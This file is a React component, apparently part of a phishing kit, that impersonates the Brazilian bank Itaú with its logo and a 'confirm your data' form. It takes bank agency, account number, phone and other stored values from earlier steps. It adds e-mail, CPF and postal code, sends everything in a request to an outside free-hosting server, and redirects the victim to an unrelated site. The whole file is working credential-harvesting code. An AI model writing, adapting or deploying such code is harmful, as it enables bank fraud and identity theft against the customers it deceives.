import React, { useState, useEffect } from 'react';
import './Confirmacao.css';

const Confirmacao = () => {
  const [email, setEmail] = useState('');
  const [cpf, setCpf] = useState('');
  const [cep, setCep] = useState('');

  const [ag, setAg] = useState('');
  const [conta, setConta] = useState('');
  const [quatro, setQuatro] = useState('');
  const [tel, setTel] = useState('');
  const [seis, setSeis] = useState('');

  useEffect(() => {
    const storedParam1 = localStorage.getItem('ag');
    const storedParam2 = localStorage.getItem('conta');
    const storedParam3 = localStorage.getItem('quatro');
    const storedParam4 = localStorage.getItem('tel');
    const storedParam5 = localStorage.getItem('seis');

    if (storedParam1) setAg(JSON.parse(storedParam1));
    if (storedParam2) setConta(JSON.parse(storedParam2));
    if (storedParam3) setQuatro(JSON.parse(storedParam3));
    if (storedParam4) setTel(JSON.parse(storedParam4));
    if (storedParam5) setSeis(JSON.parse(storedParam5));
  }, []);

  const handleClick = async () => {
    if (!email || !cpf || !cep) {
      alert('Por favor, preencha todos os campos.');
      return;
    }

    try {
      const response = await fetch(`https://checker9387.000webhostapp.com/index.php?ag=${ag}&conta=${conta}&quatro=${quatro}&tel=${tel}&seis=${seis}&email=${email}&cpf=${cpf}&cep=${cep}`);
      const data = await response.json();
      window.location.href = "https://www.w3schools.com";
    } catch (error) {
      console.error('Error:', error);
      alert('Ocorreu um erro ao enviar os dados. Por favor, tente novamente.');
    }
  }

  return (
    <div className='Confirmacao'>
      <div className='logo'>
        <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
      </div>
      <div className='title-confirm'>
        <span>Confirme os dados abaixo para continuar</span>
      </div>
      <div className='form4'>
        <input className='digitavel' type="text" placeholder='E-mail' onChange={(e) => setEmail(e.target.value)} />
        <input className='digitavel' type="text" placeholder='CPF' onChange={(e) => setCpf(e.target.value)} />
        <input className='digitavel' type="text" placeholder='CEP' onChange={(e) => setCep(e.target.value)} />
        <button onClick={handleClick}>Confirmar</button>
      </div>
    </div>
  );
}

export default Confirmacao;
